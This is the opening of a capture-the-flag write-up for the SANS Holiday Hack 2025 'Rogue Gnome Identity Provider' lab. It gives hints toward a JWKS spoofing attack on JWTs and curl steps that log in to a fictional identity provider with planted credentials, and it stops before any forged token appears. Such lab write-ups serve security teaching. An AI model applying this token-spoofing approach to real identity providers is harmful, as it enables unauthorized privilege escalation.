
<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
      
        <meta name="author" content="Michelle "Aeronique" Duell">
      
      
        <link rel="canonical" href="https://hhc2025.aerobytes.io/objectives/o16/">
      
      
        <link rel="prev" href="../o15/">
      
      
        <link rel="next" href="../o17/">
      
      
        
      
      
      <link rel="icon" href="../../img/misc/favicon.ico">
      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.1">
    
    
      
        <title>Rogue Gnome Identity Provider - SANS Holiday Hack Challenge 2025 Write-Up</title>
      
    
    
      <link rel="stylesheet" href="../../assets/stylesheets/main.484c7ddc.min.css">
      
        
        <link rel="stylesheet" href="../../assets/stylesheets/palette.ab4e12ef.min.css">
      
      


    
    
      
    
    
      
        
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
      
    
    
      <link rel="stylesheet" href="../../css/extra.css">
    
    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
    
      

    
    
  </head>
  
  
    
    
      
    
    
    
    
    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="custom" data-md-color-accent="light-blue">
  
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#overview" class="md-skip">
          Skip to content
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
    
      

  

<header class="md-header md-header--shadow" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="Header">
    <a href="../.." title="SANS Holiday Hack Challenge 2025 Write-Up" class="md-header__button md-logo" aria-label="SANS Holiday Hack Challenge 2025 Write-Up" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M403 211.7c32.2-24.9 53-63.9 53-107.7 0-75.1-60.9-136-136-136S184 28.9 184 104c0 43.9 20.8 82.9 53 107.7-32.2 16.3-59 41.8-76.8 73.1L112 264.2V224c0-13.3-10.7-24-24-24s-24 10.7-24 24v19.6l-22.5-9.7c-12.2-5.2-26.3.4-31.5 12.6s.4 26.3 12.6 31.5c36.1 15.5 75.9 32.5 119.4 51.2-3.9 14.9-6 30.6-6 46.7 0 70 39.1 130.8 96.6 161.9 7.9 4.3 16.9 6.1 25.9 6.1h123c9 0 18-1.8 25.9-6.1 57.5-31.1 96.6-92 96.6-161.9 0-16.2-2.1-31.8-6-46.7 43.5-18.7 83.4-35.7 119.4-51.2 12.2-5.2 17.8-19.3 12.6-31.5s-19.3-17.8-31.5-12.6l-22.5 9.7V224c0-13.3-10.7-24-24-24s-24 10.7-24 24v40.2l-48.2 20.6c-17.9-31.3-44.6-56.8-76.8-73.1M296 416a24 24 0 1 1 48 0 24 24 0 1 1-48 0m24-120a24 24 0 1 1 0 48 24 24 0 1 1 0-48M248 80a24 24 0 1 1 48 0 24 24 0 1 1-48 0m120-24a24 24 0 1 1 0 48 24 24 0 1 1 0-48m-75.8 103.3c-2.7-4.8-4.2-10.2-4.2-15.7 0-17.5 14.2-31.6 31.6-31.6h.8c17.5 0 31.6 14.2 31.6 31.6 0 5.5-1.4 10.9-4.2 15.7L327 195.8c-3.1 5.4-10.8 5.4-13.9 0l-20.9-36.6z"/></svg>

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            SANS Holiday Hack Challenge 2025 Write-Up
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              Rogue Gnome Identity Provider
            
          </span>
        </div>
      </div>
    </div>
    
      
        <form class="md-header__option" data-md-component="palette">
  
    
    
    
    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="custom" data-md-color-accent="light-blue"  aria-hidden="true"  type="radio" name="__palette" id="__palette_0">
    
  
</form>
      
    
    
      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
    
    
    
      
      
        <label class="md-header__button md-icon" for="__search">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
        </label>
        <div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
      <label class="md-search__icon md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
      </label>
      <nav class="md-search__options" aria-label="Search">
        
        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
        </button>
      </nav>
      
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            Initializing search
          </div>
          <ol class="md-search-result__list" role="presentation"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
      
    
    
  </nav>
  
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
          
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    



  

<nav class="md-nav md-nav--primary md-nav--integrated" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href="../.." title="SANS Holiday Hack Challenge 2025 Write-Up" class="md-nav__button md-logo" aria-label="SANS Holiday Hack Challenge 2025 Write-Up" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M403 211.7c32.2-24.9 53-63.9 53-107.7 0-75.1-60.9-136-136-136S184 28.9 184 104c0 43.9 20.8 82.9 53 107.7-32.2 16.3-59 41.8-76.8 73.1L112 264.2V224c0-13.3-10.7-24-24-24s-24 10.7-24 24v19.6l-22.5-9.7c-12.2-5.2-26.3.4-31.5 12.6s.4 26.3 12.6 31.5c36.1 15.5 75.9 32.5 119.4 51.2-3.9 14.9-6 30.6-6 46.7 0 70 39.1 130.8 96.6 161.9 7.9 4.3 16.9 6.1 25.9 6.1h123c9 0 18-1.8 25.9-6.1 57.5-31.1 96.6-92 96.6-161.9 0-16.2-2.1-31.8-6-46.7 43.5-18.7 83.4-35.7 119.4-51.2 12.2-5.2 17.8-19.3 12.6-31.5s-19.3-17.8-31.5-12.6l-22.5 9.7V224c0-13.3-10.7-24-24-24s-24 10.7-24 24v40.2l-48.2 20.6c-17.9-31.3-44.6-56.8-76.8-73.1M296 416a24 24 0 1 1 48 0 24 24 0 1 1-48 0m24-120a24 24 0 1 1 0 48 24 24 0 1 1 0-48M248 80a24 24 0 1 1 48 0 24 24 0 1 1-48 0m120-24a24 24 0 1 1 0 48 24 24 0 1 1 0-48m-75.8 103.3c-2.7-4.8-4.2-10.2-4.2-15.7 0-17.5 14.2-31.6 31.6-31.6h.8c17.5 0 31.6 14.2 31.6 31.6 0 5.5-1.4 10.9-4.2 15.7L327 195.8c-3.1 5.4-10.8 5.4-13.9 0l-20.9-36.6z"/></svg>

    </a>
    SANS Holiday Hack Challenge 2025 Write-Up
  </label>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../.." class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Welcome
  

    
  </span>
  
  

      </a>
    </li>
  

    
      
      
  
  
    
  
  
  
    
    
    
    
      
        
        
      
    
    
    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked>
        
          
          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="">
            
  
  
  <span class="md-ellipsis">
    
  
    Objectives
  

    
  </span>
  
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true">
          <label class="md-nav__title" for="__nav_2">
            <span class="md-nav__icon md-icon"></span>
            
  
    Objectives
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    
    
    
    
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_1" >
        
          
          <label class="md-nav__link" for="__nav_2_1" id="__nav_2_1_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    
  
    Orientation
  

    
  </span>
  
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_1_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_1">
            <span class="md-nav__icon md-icon"></span>
            
  
    Orientation
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../o1/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Holiday Hack Orientation
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2" >
        
          
          <label class="md-nav__link" for="__nav_2_2" id="__nav_2_2_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    
  
    Act 1
  

    
  </span>
  
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_2">
            <span class="md-nav__icon md-icon"></span>
            
  
    Act 1
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../o2/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    It's All About Defang
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../o3/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Neighborhood Watch Bypass
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../o4/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Santa's Gift-Tracking Service Port Mystery
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../o5/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Visual Networking Thinger
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../o6/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Visual Firewall Thinger
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../o7/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Intro to Nmap
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../o8/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Blob Storage Challenge in the Neighborhood
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../o9/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Spare Key
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../o10/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    The Open Door
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../o11/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Owner
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
    
  
  
  
    
    
    
    
      
    
    
    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_3" checked>
        
          
          <label class="md-nav__link" for="__nav_2_3" id="__nav_2_3_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    
  
    Act 2
  

    
  </span>
  
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_3_label" aria-expanded="true">
          <label class="md-nav__title" for="__nav_2_3">
            <span class="md-nav__icon md-icon"></span>
            
  
    Act 2
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../o12/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Retro Recovery
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../o13/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Mail Detective
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../o14/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    IDORable Bistro
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../o15/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Dosis Network Down
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
    
  
  
  
    <li class="md-nav__item md-nav__item--active">
      
      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
      
      
      
        <label class="md-nav__link md-nav__link--active" for="__toc">
          
  
  
  <span class="md-ellipsis">
    
  
    Rogue Gnome Identity Provider
  

    
  </span>
  
  

          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <a href="./" class="md-nav__link md-nav__link--active">
        
  
  
  <span class="md-ellipsis">
    
  
    Rogue Gnome Identity Provider
  

    
  </span>
  
  

      </a>
      
        

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#overview" class="md-nav__link">
    <span class="md-ellipsis">
      
        Overview
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#hints" class="md-nav__link">
    <span class="md-ellipsis">
      
        Hints
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#solution" class="md-nav__link">
    <span class="md-ellipsis">
      
        Solution
      
    </span>
  </a>
  
</li>
      
    </ul>
  
</nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../o17/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Quantgnome Leap
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../o18/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Going in Reverse
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_4" >
        
          
          <label class="md-nav__link" for="__nav_2_4" id="__nav_2_4_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    
  
    Act 3
  

    
  </span>
  
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_4_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_4">
            <span class="md-nav__icon md-icon"></span>
            
  
    Act 3
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../o19/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Gnome Tea
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../o20/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Hack-a-Gnome
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../o21/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Snowcat RCE & Priv Esc
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../o22/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Schr√∂dinger's Scope
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../o23/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Find and Shutdown Frosty's Snowglobe Machine
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../o24/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    On the Wire
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../o25/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Free Ski
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_5" >
        
          
          <label class="md-nav__link" for="__nav_2_5" id="__nav_2_5_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    
  
    The Final Showdown
  

    
  </span>
  
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_5_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_5">
            <span class="md-nav__icon md-icon"></span>
            
  
    The Final Showdown
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../o26/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Snowblind Ambush
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
      
        
        
      
    
    
    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
        
          
          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="">
            
  
  
  <span class="md-ellipsis">
    
  
    Extras
  

    
  </span>
  
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3">
            <span class="md-nav__icon md-icon"></span>
            
  
    Extras
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../gnomes/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Meet the Gnomes!
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../easter_eggs/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Easter Egg of DOOM!
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
          
          
            <div class="md-content" data-md-component="content">
              
              <article class="md-content__inner md-typeset">
                
                  



  <h1>Rogue Gnome Identity Provider</h1>

<h2 id="overview">Overview<a class="headerlink" href="#overview" title="Permanent link">‚öìÔ∏é</a></h2>
<p><img alt="First screenshot" src="../../img/objectives/o16/map_o16.png" /></p>
<p>Hike over to <strong>Paul</strong> in the <strong>park</strong> for a gnomey authentication puzzle adventure. What malicious firmware image are the gnomes downloading?</p>
<p><img src="/img/objectives/o16/hi_paul.png" style="float: left; margin-right: 20px; margin-bottom: 10px; width: 150px;" alt="Paul"></p>
<div class="admonition quote">
<p class="admonition-title">Paul</p>
<p>Hey, I‚Äôm Paul!</p>
<p>I‚Äôve been at Counter Hack since 2024 and loving every minute of it.</p>
<p>I‚Äôm a pentester who digs into web, API, and mobile apps, and I‚Äôm also a fan of Linux.</p>
<p>When I‚Äôm not hacking away, you can catch me enjoying board games, hiking, or paddle boarding!</p>
</div>
<div style="clear: both;"></div>

<div class="admonition quote">
<p class="admonition-title">Paul</p>
<p>As a pentester, I proper love a good privilege escalation challenge, and that's exactly what we've got here.</p>
<p>I've got access to a Gnome's Diagnostic Interface at <code>gnome-48371.atnascorp</code> with the creds <code>gnome:SittingOnAShelf</code>, but it's just a low-privilege account.</p>
<p>The gnomes are getting some dodgy updates, and I need admin access to see what's actually going on.</p>
<p>Ready to help me find a way to bump up our access level, yeah?</p>
</div>
<h2 id="hints">Hints<a class="headerlink" href="#hints" title="Permanent link">‚öìÔ∏é</a></h2>
<details class="example">
<summary>Rogue Gnome IDP (1)</summary>
<p>It looks like the JWT uses JWKS. Maybe a JWKS spoofing attack would work.</p>
</details>
<details class="example">
<summary>Rogue Gnome IDP (2)</summary>
<p><a href="https://github.com/ticarpi/jwt_tool/wiki">Ticarpi</a> and <a href="https://portswigger.net/web-security/jwt">Portswigger</a> have some great information on analyzing JWT's and performing JWT attacks.</p>
</details>
<details class="example">
<summary>Rogue Gnome IDP (3)</summary>
<p>If you need to host any files for the attack, the server is running a webserver available locally <a href="http://paulweb.neighborhood/">here</a> . The files for the site are stored in ~/www.</p>
</details>
<h2 id="solution">Solution<a class="headerlink" href="#solution" title="Permanent link">‚öìÔ∏é</a></h2>
<h3 id="pauls-treasure-map-of-auth-flows">Paul's Treasure Map of Auth Flows<a class="headerlink" href="#pauls-treasure-map-of-auth-flows" title="Permanent link">‚öìÔ∏é</a></h3>
<p>Paul left us some helpful notes. Let's see what we're working with:</p>
<div class="highlight"><pre><span></span><code>cat<span class="w"> </span>notes
</code></pre></div>
<div class="admonition info">
<p class="admonition-title">Paul's Helpful Notes!</p>
<div class="highlight"><pre><span></span><code><span class="c1"># Sites</span>

<span class="c1">## Captured Gnome:</span>
curl<span class="w"> </span>http://gnome-48371.atnascorp/

<span class="c1">## ATNAS Identity Provider (IdP):</span>
curl<span class="w"> </span>http://idp.atnascorp/

<span class="c1">## My CyberChef website:</span>
curl<span class="w"> </span>http://paulweb.neighborhood/
<span class="c1">### My CyberChef site html files:</span>
~/www/


<span class="c1"># Credentials</span>

<span class="c1">## Gnome credentials (found on a post-it):</span>
Gnome:SittingOnAShelf


<span class="c1"># Curl Commands Used in Analysis of Gnome:</span>

<span class="c1">## Gnome Diagnostic Interface authentication required page:</span>
curl<span class="w"> </span>http://gnome-48371.atnascorp

<span class="c1">## Request IDP Login Page</span>
curl<span class="w"> </span>http://idp.atnascorp/?return_uri<span class="o">=</span>http%3A%2F%2Fgnome-48371.atnascorp%2Fauth

<span class="c1">## Authenticate to IDP</span>
curl<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>--data-binary<span class="w"> </span><span class="s1">$&#39;username=gnome&amp;password=SittingOnAShelf&amp;return_uri=http%3A%2F%2Fgnome-48371.atnascorp%2Fauth&#39;</span><span class="w"> </span>http://idp.atnascorp/login

<span class="c1">## Pass Auth Token to Gnome</span>
curl<span class="w"> </span>-v<span class="w"> </span>http://gnome-48371.atnascorp/auth?token<span class="o">=</span>&lt;insert-JWT&gt;

<span class="c1">## Access Gnome Diagnostic Interface</span>
curl<span class="w"> </span>-H<span class="w"> </span><span class="s1">&#39;Cookie: session=&lt;insert-session&gt;&#39;</span><span class="w"> </span>http://gnome-48371.atnascorp/diagnostic-interface

<span class="c1">## Analyze the JWT</span>
jwt_tool.py<span class="w"> </span>&lt;insert-JWT&gt;
</code></pre></div>
</div>
<p>Paul documented the entire authentication flow and gave us compromised credentials (<code>gnome:SittingOnAShelf</code>) that were left on a post-it note! Someone actually wrote down their password and stuck it where anyone could find it. Time to put these credentials to work! üéÖ</p>
<hr />
<h3 id="walking-through-the-gnomes-front-door">Walking Through the Gnome's Front Door<a class="headerlink" href="#walking-through-the-gnomes-front-door" title="Permanent link">‚öìÔ∏é</a></h3>
<p>Let's trace through the normal authentication process to understand how it works.</p>
<div class="highlight"><pre><span></span><code>curl<span class="w"> </span>http://gnome-48371.atnascorp
</code></pre></div>
<p><img alt="Second screenshot" src="../../img/objectives/o16/s1.png" /></p>
<p>The gnome requires authentication and redirects to the IDP. Let's authenticate with the compromised credentials:</p>
<p><div class="highlight"><pre><span></span><code>curl<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>--data-binary<span class="w"> </span><span class="s1">$&#39;username=gnome&amp;password=SittingOnAShelf&amp;return_uri=http%3A%2F%2Fgnome-48371.atnascorp%2Fauth&#39;</span><span class="w"> </span>http://idp.atnascorp/login
</code></pre></div>
<img alt="Second screenshot" src="../../img/objectives/o16/s2.png" /></p>
<p>Got our JWT! The IDP returns a redirect with the token. Now we pass this to the gnome's auth endpoint:</p>
